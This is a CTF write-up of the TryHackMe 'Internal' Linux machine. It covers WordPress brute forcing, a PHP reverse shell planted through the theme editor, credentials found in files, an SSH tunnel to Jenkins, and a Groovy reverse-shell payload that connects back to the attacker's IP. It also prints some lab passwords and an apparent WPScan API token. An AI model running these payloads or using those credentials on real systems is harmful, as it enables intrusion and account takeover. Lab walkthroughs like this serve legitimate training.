---
layout: post
title: THM Internal WriteUp
date: 2025-03-05
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - WordPress-Explotation
  - Jenkins
  - HTTP-Brute-Force
  - Reverse-SSH-Tunneling
  - Credentials-Leakage
  - Fuzzing
  - Privilege-Escalation
media_subpath: /assets/img/Internal
---
![Desktop View](Internal.jpeg){: w="400"  h="400" }



# Internal Skills


>**Internal** is a hard Linux machine where we will use the following skills:

- **Port Discovery**
- **Web Application Enumeration**
- **WordPress Enumeration**
- **Brute Forcing WordPress Credentials**
- **Exploiting WordPress Plugin Upload for RCE**
- **Reverse Shell Execution**
- **Jenkins Enumeration**
- **Exploiting Jenkins for Code Execution**
- **Linux Privilege Enumeration**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22** & port **80**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.27.35 -oG allPorts
Nmap scan report for 10.10.27.35
Host is up, received user-set (0.099s latency).
Scanned at 2025-03-05 20:08:57 CET for 16s
Not shown: 65529 closed tcp ports (reset), 4 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80 10.10.27.35 -oN targeted
Nmap scan report for 10.10.27.35
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have to check the following ports & services:

- **Port 22 --> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3**
- **Port  80 -->  Apache httpd 2.4.29 ((Ubuntu))**

Let's start with the **HTTP** service.

---
## Port 80 Enumeration

***At this point i added the domain `internal.thm` to my `/etc/hosts` file***

```bash
echo "10.10.27.35 internal.thm" > /etc/hosts
```

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.27.35
http://10.10.27.35 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.27.35], Title[Apache2 Ubuntu Default Page: It works]
```

Nothing really useful found, seems like a default **Apache** page, let's take a look inside the website, once inside ***http://10.10.27.35***, as expected it was a default **Apache** page.

![Desktop View](InternalMainPage.png) 

Since we can't do much with a default **Apache** page, let's fuzz in order to find directories.

```bash
❯ gobuster dir -u http://10.10.27.35 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.27.35
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/blog                 (Status: 301) [Size: 309] [--> http://10.10.27.35/blog/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.27.35/javascript/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.27.35/phpmyadmin/]
/server-status        (Status: 403) [Size: 276]
/wordpress            (Status: 301) [Size: 314] [--> http://10.10.27.35/wordpress/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

We found four directories, after checking each of the directories, i found  the following for each dir:

- `/blog` -> **Wordpress Main Page**
- `/javascript` -> **Forbidden (403)
- `/phpmyadmin` -> **PhpMyAdmin Login Page**
- `/wordpress`  -> **Oops! That page can’t be found. (404)** 

So, let's start with the **Wordpress** page (`/blog`).

![Desktop View](InternalWPMainPage.png)

Since we are facing a **Wordpress**, i will use `wpscan` in order to find any vulnerability.

```bash
❯ wpscan --url http://internal.thm/blog -v --api-token "*********************************************"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.27.35]
[+] Started: Wed Mar  5 20:38:10 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

<REDACTED>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <============================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 22
```

Analyzing a bit the output, we can see that the `xmlrpc.php` is enabled, this allow us to brute-force credentials without limits, we also found a user `admin`, so the next step that i found plausible is to brute force the `admin` password.

```bash
❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt --api-token "WkDah4Og5UQhI6ZdhJrY5u855DH1CrubMqaTrlmjxvk"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.27.35]
[+] Started: Wed Mar  5 20:51:06 2025

[+] Performing password attack on Xmlrpc against 1 user/s

[!] Valid Combinations Found:
 | Username: admin, Password: *******
```

Bingo, we now have valid credentials for the user `admin`, let's login now, we can log in in the next URL: `http://internal.thm/blog/wp-login.php`.

![Desktop View](InternalWPDashboard.png)

Once inside the **Wordpress** dashboard it's pretty easy to get RCE, we can upload a webshell doing the following steps: **Appearance -> Theme Editor**.

Then we have to select the currently active **Theme**, in this case **Twenty Seventeen**, so select **Twenty Seventeen**, and select the **Main Index Template (index.php)** file and change it's content with the classic **pentestmonkey** reverse shell.

You can download the reverse shell here: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![Desktop View](InternalWPReverseShell.png)

Once modified, click the button **Update File**, then we just have to set a `netcat` listener and access the following URL: ***http://internal.thm/blog***.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.14.99.119] from (UNKNOWN) [10.10.27.35] 55396
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:07:19 up  1:00,  0 users,  load average: 0.00, 0.03, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Shell as www-data

### TTY Treatment 

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

### Privilege Escalation

Once with a stable shell, we can begin with the **privilege escalation** phase, i checked the `sudoers`, `SUID binaries`, `Cron Jobs`, `Capabilities`, etc. Nothing found, i also checked the `/var/www/html/wordpress/wp-config.php` file and the `/etc/phpmyadmin/config-db.php` and i found the following credentials:

- `wp-config.php` -> `wordpress:wordpress123`
- `config-db.php` -> `phpmyadmin:B2Ud4fEOZmVq`

The `wp-config.php` credentials works for the `mySQL` database, after checking the database nothing useful was found.

The `config-db.php` credentials just work for the **PhpMyAdmin** website login form.

I checked the system users.

```bash
www-data@internal:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
```

After checking both passwords with both users none worked.

So, after all this, i uploaded the `linpeas.sh` script to see if i missed something, let's download the script locally first and host it with a webserver.

```bash
❯ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then we can just download the script from the target machine

```bash
www-data@internal:/$ cd /tmp/
www-data@internal:/tmp$ wget http://10.14.99.119/linpeas.sh
--2025-03-05 20:50:58--  http://10.14.99.119/linpeas.sh
Connecting to 10.14.99.119:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 820.39K   532KB/s    in 1.5s    

2025-03-05 20:50:59 (532 KB/s) - 'linpeas.sh' saved [840082/840082]

www-data@internal:/tmp$ chmod +x linpeas.sh 
```

Once with the script downloaded and with the right permissions, we can execute it.

```bash
www-data@internal:/tmp$ ./linpeas.sh 

<REDACTED>

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt

<REDACTED>
```

After a quick look to the output, i found an file named `wp-save.txt` under `/opt`, after reading it's content, i found credentials for the user `aubreanna`.

```bash
www-data@internal:/tmp$ cat /opt/wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:b**b13g******23
```

So, let's log in as `aubreanna`.

```bash
www-data@internal:/tmp$ su aubreanna
Password: *************
aubreanna@internal:/tmp$ 
```

---

## Shell as aubreanna

Once as user `aubreanna` we can read the `user.txt` flag at `/home/aubreanna/user.txt`.

```bash
aubreanna@internal:~$ cat /home/aubreanna/user.txt 
THM{***************}
```

Checking the `aubreanna` home directory there is a file named `jenkins.txt` telling us that there is Jenkins service running internally.

```bash
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

So, since we now own credentials and `ssh` service is running, let's port forward the `8080` port with `ssh`.

```bash
❯ ssh -L 8080:172.17.0.2:8080 aubreanna@10.10.27.35
```
### Port 8080 Enumeration

Once with the **Jenkins** service accessible from our machine, let's access it via browser: `http://localhost:8080`.

After accessing, as expected we found a **Jenkins** login form.

![Desktop View](InternalJenkinsMainPage.png)
 
I tried all the credentials that we have found, but none of them work, i also tried the default credentials for **Jenkins**: `admin:password`, nothing. 

The `admin` user is usually worth trying to brute-force, so let's try it, i find it quite convenient to use the metasploit module `auxiliary/scanner/http/jenkins_login`.

Let's start configuring the module.

```bash
❯ msfconsole
msf6 > use auxiliary/scanner/http/jenkins_login
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(scanner/http/jenkins_login) > set username admin
username => admin        
msf6 auxiliary(scanner/http/jenkins_login) > set pass_file /usr/share/wordlists/rockyou.txt
pass_file => //usr/share/wordlists/rockyou.txt
```

Once with the module configured, let's run it.

```bash
msf6 auxiliary(scanner/http/jenkins_login) > run
[+] 127.0.0.1:8080 - Login Successful: admin:sp*****ob
[*] Scanned 1 of 1 hosts (100% complete)
```

Bingo, we found valid credentials, so let's log in.

![Desktop View](InternalJenkinsDashboard.png)

Once in the dashboard, **Jenkins** allow authenticated users to run **Groovy scripts**, so we can try to engage a reverse shell, using a **Groovy** payload.

In order to access the field where we can execute **Groovy scripts** we can follow the next steps: **Manage Jenkins** -> **Scripts Console** and we should see a field asking us execute **Groovy scripts**.

![Desktop View](InternalGroovyScript.png)

We can now set a listener and execute the next **Groovy payload** and we should get a reverse shell.

```bash
String host="10.14.99.119";int port=443;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Set the listener at port **443**, copy the payload into the form and then execute it, we should get a reverse shell.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.14.99.119] from (UNKNOWN) [10.10.27.35] 47816
whoami
jenkins
```

### Shell as Jenkins

Once inside as Jenkins, i tried some ways to **PrivEsc** but none works, as before we found a file in `/opt`, i checked it and i found a file named `notes.txt`.

```bash
jenkins@jenkins:/$ cat /opt/note.txt 
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:t***b13gu*****23
```

Bingo, we found credentials for `root`.

I tried login in the current contained, but it didn't work, so i tried the credentials in the shell that we gained before and they did work.

```bash
aubreanna@internal:~$ su root                                                                                                                                                      
Password: *************
root@internal:/home/aubreanna# 
```

Now you can read the `root.txt` flag at `/root/root.txt`.

```bash
root@internal:/home/aubreanna# cat /root/root.txt 
THM{*****************}
```

## Final Thoughts

The **Internal** machine offers a comprehensive learning experience, emphasizing the exploitation of **WordPress vulnerabilities** and **Linux privilege escalation**. The initial access phase involves identifying and exploiting a **WordPress installation**, underscoring the importance of thorough **web application enumeration** and **version detection**. Gaining a foothold requires leveraging compromised credentials to access the WordPress administrator panel and injecting a **PHP reverse shell** through theme modification. Privilege escalation is achieved by exploiting a **Jenkins instance with weak credentials**, demonstrating the critical need for proper configuration management. This machine effectively reinforces key skills in **web exploitation**, **password cracking**, and **privilege escalation**, serving as a valuable exercise for those seeking to enhance their penetration testing capabilities

![Desktop View](InternalPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

